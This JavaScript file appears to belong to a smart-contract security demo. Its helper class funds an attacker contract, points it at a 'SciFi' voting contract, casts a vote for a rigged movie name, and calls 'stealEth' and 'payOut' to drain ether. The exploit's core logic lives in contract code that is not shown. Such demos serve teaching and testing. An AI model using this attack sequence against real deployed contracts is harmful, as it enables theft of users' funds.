class AttackerHelper {

  constructor(AttackerContract, sciFiContract) {
    this.attackerContract = AttackerContract;
    this.sciFiContract = sciFiContract;

    this.doAttack    = this.doAttack.bind(this)
    this.attackSciFi = this.attackSciFi.bind(this)
  }

   doAttack (movieName, web3, accounts, AttackerInstance, SciFiInstance) {

    return AttackerInstance.fundMe(
      {from: accounts[0], gas:200000, value: web3.toWei(5,'ether')})
      .then(() => {
        return AttackerInstance.setSciFiAddress(
          SciFiInstance.address,
          {from: accounts[0], gas:200000})
        .then(() => {
           return AttackerInstance.vote(
             web3.toHex(movieName),
             web3.toWei(5,'ether'),
             {from: accounts[0], gas:400000})
           .then(() => {
             return AttackerInstance.stealEth({from: accounts[0], gas:1000000})
            .then(() => {
              return AttackerInstance.payOut({from: accounts[0], gas:400000})
            })
          })
        })
       })
  }

  // Attack function
  // @TODO: break this beast up
  attackSciFi(web3, movieData) {
    return new Promise((resolve, reject) => {
      const {attackerContract, sciFiContract} = this;
      const movieName = movieData.riggedName

      attackerContract.setProvider(web3.currentProvider)
      sciFiContract.setProvider(web3.currentProvider)

      // Declaring this for later so we can chain functions on Attacker.
      var AttackerInstance
      var SciFiInstance
      // Get accounts.
      web3.eth.getAccounts((error, accounts) => {

        sciFiContract.deployed().then((instance) => {
          SciFiInstance = instance
          attackerContract.deployed().then((instance) => {
            AttackerInstance = instance
            // this funds the attacker contract
            this.doAttack(movieName, web3, accounts, AttackerInstance, SciFiInstance).then(()=>{
              resolve()
            })
          })
        })
      })
    })
  }
}

export default AttackerHelper
